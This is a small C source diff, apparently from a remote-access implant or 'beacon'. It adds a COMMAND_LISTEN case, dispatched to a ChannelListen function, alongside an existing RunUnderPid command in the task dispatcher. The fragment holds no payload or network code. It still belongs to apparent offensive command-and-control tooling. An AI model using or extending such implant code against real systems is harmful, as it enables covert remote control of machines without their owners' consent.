@@ -3,6 +3,7 @@
 #include "job.h"
 #include "argument.h"
 #include "beacon.h"
+#include "channel.h"
 #include "command.h"
 #include "filesystem.h"
 #include "identity.h"
@@ -85,6 +86,9 @@ void TaskDispatch(int cmd, char* buffer, int size)
 			break;
 		case COMMAND_RUN_UNDER_PID:
 			RunUnderPid(buffer, size);
+			break;
+		case COMMAND_LISTEN:
+			ChannelListen(buffer, size);
 			break;
 	}
 }
